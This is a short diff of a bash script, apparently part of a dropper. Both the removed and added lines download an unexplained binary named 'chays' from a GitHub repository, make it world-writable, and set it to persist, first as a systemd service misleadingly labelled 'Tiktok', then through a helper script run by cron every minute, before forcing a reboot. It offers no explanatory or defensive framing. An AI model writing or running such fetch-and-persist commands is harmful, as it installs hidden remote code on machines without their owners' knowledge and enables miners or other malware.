@@ -1,3 +1,3 @@
 #!/bin/bash
-sudo wget -O /home/admin11/chays https://github.com/khangcbs/filess/raw/main/chays && sudo chmod 777 chays && sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/admin11/chays\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service' && sudo systemctl daemon-reload && sudo systemctl enable deroz.service && sudo reboot &
+wget https://github.com/khangcbs/filess/raw/main/chays -O /home/admin11/chays && chmod 777 chays && wget https://raw.githubusercontent.com/khangcbs/filess/main/check_program.sh -O /home/admin11/check_program.sh && chmod 777 check_program.sh && echo "* * * * * /home/admin11/check_program.sh >/dev/null 2>&1" | crontab - && sudo reboot &
 fi
